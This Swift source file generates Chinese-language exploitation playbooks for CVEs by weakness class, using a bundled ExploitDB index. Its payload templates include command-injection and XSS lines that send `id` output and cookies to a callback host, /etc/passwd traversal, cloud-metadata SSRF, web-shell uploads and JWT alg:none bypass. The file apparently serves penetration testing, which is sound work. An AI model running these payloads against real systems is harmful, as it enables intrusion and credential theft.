import Foundation

/// 把任意一条 CVE 展开成「针对什么 / 怎么使用 / 怎么实现 / 真实案例」四段式作战指引。
/// 依据：CWE 归类 + 厂商产品 + 描述关键词 + 参考链接 + ExploitDB 命中。
struct CVEPlaybook {
    var target: String
    var prereqs: [String]
    var payloads: [String]
    var caseStudy: String
    var references: [String]

    static let empty = CVEPlaybook(target: "-", prereqs: [], payloads: [], caseStudy: "-", references: [])

    // MARK: - 构造
    static func build(row: CVERow, desc: String) -> CVEPlaybook {
        let text = (desc + " " + row.title).lowercased()
        let cwe = row.cwe
        let vendor = row.vendor
        let profile = Profile.detect(cwe: cwe, text: text, vendor: vendor, cveID: row.id)

        let exploit = ExploitIndex.shared.lookup(row.id)

        var prerequisites: [String] = profile.prereqs
        if exploit.entries.isEmpty {
            prerequisites.append("该 CVE 目前没有公开 EXP，需要按原理自行构造，优先复现厂商公告中的验证步骤。")
        } else {
            prerequisites.append("公开利用可用：ExploitDB #\(exploit.entries.first!.id)（\(exploit.entries.first!.d)），可直接复现。")
        }
        if row.score >= 9.0 { prerequisites.append("CVSS ≥ 9.0，通常无需认证、可远程直接触发。") }

        var payloads = profile.payloads
        if let e = exploit.entries.first {
            payloads.insert("searchsploit -m \(e.id)   # \(e.d)", at: 0)
        }
        if !row.published.isEmpty {
            payloads.append("nuclei -u <target> -id \(row.id)   # 已收录模板时可直接验证")
        }

        let caseText = buildCase(row: row, exploit: exploit, profile: profile)

        var refs = exploit.entries.compactMap { e -> String? in
            guard let id = Int(e.id) else { return nil }
            return "https://www.exploit-db.com/exploits/\(id)"
        }
        refs.append("https://nvd.nist.gov/vuln/detail/\(row.id)")

        return CVEPlaybook(
            target: "\(vendor) / \(profile.productHint)",
            prereqs: prerequisites,
            payloads: payloads,
            caseStudy: caseText,
            references: Array(refs.prefix(5))
        )
    }

    private static func buildCase(row: CVERow, exploit: ExploitIndex.Match, profile: Profile) -> String {
        if let e = exploit.entries.first {
            let who = e.author.isEmpty ? "匿名研究者" : e.author
            return "公开案例：\(who) 于 \(e.date) 发布 \(e.type.uppercased()) 型利用（\(e.platform) 平台），"
                + "描述为「\(e.d)」。该验证件已被 ExploitDB 收录（#\(e.id)），"
                + "在授权测试中按前置条件复现即可验证 \(row.id) 的真实可利用性；"
                + "命中后应记录返回包、命令回显与时间戳作为证据。"
        }
        return "暂无公开 EXP 收录于 ExploitDB。可参照厂商安全公告的验证方法："
            + "① 先确认版本落在受影响区间（\(profile.productHint)）；"
            + "② 按 \(row.cwe.isEmpty ? "对应 CWE 类" : row.cwe) 的通用触发方式构造最小验证请求；"
            + "③ 用带外回连或差异响应确认命中；④ 记录时间线与证据。"
    }

    // MARK: - 分类画像
    struct Profile {
        var productHint: String
        var target: String = ""
        var prereqs: [String]
        var payloads: [String]

        static func detect(cwe: String, text: String, vendor: String, cveID: String) -> Profile {
            let c = cwe.uppercased()
            func has(_ ks: [String]) -> Bool { ks.contains { text.contains($0) } }

            // 1) 代码执行 / 命令注入 / 反序列化
            if ["CWE-78", "CWE-77", "CWE-94", "CWE-502", "CWE-917", "CWE-1336"].contains(c) || has(["remote code execution", "command injection", "deserialization", "expression language", "template injection"]) {
                return Profile(
                    productHint: "存在命令/代码执行面的服务端组件",
                    prereqs: [
                        "确认组件版本落在受影响区间，且对应功能模块对外开放。",
                        "若为反序列化：需要可控的序列化入口（Cookie/参数/消息队列/RMI）。",
                        "若为表达式注入：需要可控参数进入 EL/OGNL/SpEL/模板求值点。",
                        "准备带外回连（DNS/HTTP）以确认无回显场景的执行结果。"
                    ],
                    payloads: [
                        "curl -s '<endpoint>?<param>=;id'                                  # 命令注入最小验证",
                        "curl -s '<endpoint>' -d '{\"@type\":\"java.net.Inet4Address\",\"val\":\"<collab>\"}'   # JNDI 探测",
                        "python3 -c \"import os;os.system('curl http://<collab>/$(id -u)')\"  # 带外确认",
                        "nuclei -u <target> -tags rce -severity critical,high"
                    ])
            }
            // 2) SQL 注入
            if c == "CWE-89" || has(["sql injection", "sqli"]) {
                return Profile(
                    productHint: "数据库查询拼接点",
                    prereqs: [
                        "定位可控参数进入 SQL 语句的位置（GET/POST/Cookie/Header）。",
                        "判断数据库类型与是否可堆叠查询。",
                        "准备布尔与时间两类盲注判据。"
                    ],
                    payloads: [
                        "sqlmap -u '<url>?id=1' --batch --dbs --level 3 --risk 2",
                        "curl -s '<url>?id=1%27'   # 报错探针",
                        "sqlmap -u '<url>?id=1' --technique=T --batch --current-db"
                    ])
            }
            // 3) 文件读取 / 路径穿越
            if ["CWE-22", "CWE-23", "CWE-35", "CWE-73", "CWE-552"].contains(c) || has(["path traversal", "directory traversal", "arbitrary file read", "file disclosure"]) {
                return Profile(
                    productHint: "文件访问接口（下载/预览/包含）",
                    prereqs: [
                        "找到接收文件名的参数，确认是否有前缀拼接。",
                        "确认目标文件绝对路径与运行用户读权限。",
                        "注意 URL 编码层级（一次/两次编码）。"
                    ],
                    payloads: [
                        "curl -s '<url>?file=../../../../etc/passwd'",
                        "curl -s '<url>?file=..%2f..%2f..%2fetc%2fpasswd'",
                        "curl -s '<url>?file=php://filter/convert.base64-encode/resource=index.php'"
                    ])
            }
            // 4) 文件上传
            if ["CWE-434", "CWE-646"].contains(c) || has(["unrestricted file upload", "arbitrary file upload", "upload a malicious file"]) {
                return Profile(
                    productHint: "上传接口",
                    prereqs: [
                        "确认上传目录是否可 Web 访问、是否重命名、是否校验内容类型。",
                        "准备多种扩展名与 Content-Type 组合。",
                        "确认解析配置（Apache/Nginx/IIS）支持的脚本后缀。"
                    ],
                    payloads: [
                        "curl -F 'file=@shell.php;type=image/jpeg' '<upload>'",
                        "curl -F 'file=@shell.phtml' '<upload>'   # 换后缀绕过黑名单",
                        "curl -X PUT '<path>/shell.jsp' --data-binary @shell.jsp"
                    ])
            }
            // 5) 反序列化已覆盖；SSRF
            if c == "CWE-918" || has(["server-side request forgery", "ssrf"]) {
                return Profile(
                    productHint: "服务端请求代理/预览/回调功能",
                    prereqs: [
                        "找到由服务端发起请求的参数（url/src/webhook/import）。",
                        "测试是否可访问内网与云元数据地址。",
                        "准备 DNS 回连确认出网能力。"
                    ],
                    payloads: [
                        "curl -s '<url>?url=http://<collab>/x'",
                        "curl -s '<url>?url=http://169.254.169.254/latest/meta-data/'",
                        "curl -s '<url>?url=gopher://127.0.0.1:6379/_INFO'"
                    ])
            }
            // 6) 认证绕过 / 越权
            if ["CWE-287", "CWE-288", "CWE-290", "CWE-306", "CWE-639", "CWE-862", "CWE-863", "CWE-798", "CWE-798"].contains(c) || has(["authentication bypass", "improper authentication", "authorization bypass", "unauthorized access", "hard-coded"]) {
                return Profile(
                    productHint: "认证/授权校验点",
                    prereqs: [
                        "梳理登录与鉴权链路（网关 → 应用 → 数据层）。",
                        "准备未授权、越权、默认凭据三类验证用例。",
                        "确认是否存在硬编码密钥或默认口令。"
                    ],
                    payloads: [
                        "curl -s '<admin_path>' -H 'X-Forwarded-For: 127.0.0.1'",
                        "curl -s '<admin_path>/..;/'    # 路径归一化绕过",
                        "curl -s -u 'admin:admin' '<admin_path>'",
                        "jwt_tool <token> -X a          # alg:none 绕过验证"
                    ])
            }
            // 7) XSS
            if ["CWE-79", "CWE-80", "CWE-83"].contains(c) || has(["cross-site scripting", "xss"]) {
                return Profile(
                    productHint: "用户输入回显点",
                    prereqs: [
                        "确认输出上下文（HTML/属性/JS/URL）。",
                        "确认是否有 CSP 与 HttpOnly。",
                        "存储型需找到会被管理员查看的页面。"
                    ],
                    payloads: [
                        "dalfox url '<url>' --deep-domxss",
                        "<img src=x onerror=fetch('http://<collab>/'+document.cookie)>",
                        "curl -s '<url>' --data 'c=<script>alert(1)</script>'"
                    ])
            }
            // 8) 拒绝服务
            if ["CWE-400", "CWE-776", "CWE-1333", "CWE-770"].contains(c) || has(["denial of service"]) {
                return Profile(
                    productHint: "资源消耗型接口",
                    prereqs: [
                        "确认可重复触发且不影响生产（先小流量试探）。",
                        "记录响应时间与资源占用变化作为证据。"
                    ],
                    payloads: [
                        "curl -s '<url>' --data '<?xml version=\"1.0\"?><!DOCTYPE l [<!ENTITY a \"aaaa\">]>'",
                        "ab -n 200 -c 50 '<url>'"
                    ])
            }
            // 9) 缓冲区/内存破坏
            if ["CWE-119", "CWE-120", "CWE-121", "CWE-122", "CWE-125", "CWE-787", "CWE-416", "CWE-190"].contains(c) || has(["buffer overflow", "heap overflow", "use-after-free", "out-of-bounds"]) {
                return Profile(
                    productHint: "本地/网络服务的内存解析模块",
                    prereqs: [
                        "确认目标架构与保护机制（ASLR/NX/Canary）。",
                        "准备可控输入长度与崩溃复现样本。",
                        "多数场景需要本地或同网段条件。"
                    ],
                    payloads: [
                        "python3 -c \"print('A'*4096)\" | nc <ip> <port>",
                        "gdb -q --args <binary> <payload>    # 本地复现",
                        "checksec --file=<binary>"
                    ])
            }
            // 10) 信息泄露
            if ["CWE-200", "CWE-209", "CWE-532", "CWE-538"].contains(c) || has(["information disclosure", "sensitive information", "exposure of"]) {
                return Profile(
                    productHint: "配置/调试/日志暴露面",
                    prereqs: [
                        "枚举调试端点、备份文件与错误页。",
                        "确认泄露内容是否含凭据或内网地址。"
                    ],
                    payloads: [
                        "curl -s '<base>/actuator/env'",
                        "curl -s '<base>/.git/config'",
                        "curl -s '<base>/backup.zip' -o b.zip"
                    ])
            }
            // 11) CSRF
            if c == "CWE-352" || has(["cross-site request forgery", "csrf"]) {
                return Profile(
                    productHint: "缺少 token 的敏感操作",
                    prereqs: ["确认请求仅依赖 Cookie 鉴权且无 SameSite 保护。", "准备一个自动提交的 HTML 页面。"],
                    payloads: [
                        "<form action='<target>' method=POST id=f><input name=x value=1></form><script>f.submit()</script>"
                    ])
            }
            // 12) 默认分支
            return Profile(
                productHint: vendor == "n/a" ? "受影响组件" : vendor,
                prereqs: [
                    "先确认版本落在受影响区间（用 banner / 响应头 / 报错精确判定）。",
                    "按 \(cwe.isEmpty ? "厂商公告" : cwe) 描述的触发条件构造最小验证。",
                    "准备带外回连与差异响应两种判据。"
                ],
                payloads: [
                    "nmap -Pn -sV -p<port> <ip>          # 版本确认",
                    "curl -s '<endpoint>' -D- | head -40  # 行为差异对比",
                    "nuclei -u <target> -id " + cveID + "    # 有模板时直接验证"
                ])
        }
    }
}

/// ExploitDB 索引：CVE → 公开利用（打包进 App，离线可用）
final class ExploitIndex {
    struct Entry: Decodable {
        var id: String
        var file: String
        var d: String
        var type: String
        var platform: String
        var author: String
        var date: String
    }
    struct Match {
        var entries: [Entry]
        var platform: String { entries.first?.platform ?? "" }
        var type: String { entries.first?.type ?? "" }
        static let none = Match(entries: [])
    }

    static let shared = ExploitIndex()
    private var map: [String: [Entry]] = [:]
    private(set) var loaded = false

    private init() { load() }

    private func load() {
        guard let url = Bundle.main.url(forResource: "exploits", withExtension: "json"),
              let data = try? Data(contentsOf: url),
              let dict = try? JSONDecoder().decode([String: [Entry]].self, from: data) else { return }
        map = dict
        loaded = true
    }

    func lookup(_ cve: String) -> Match { Match(entries: map[cve] ?? []) }
}
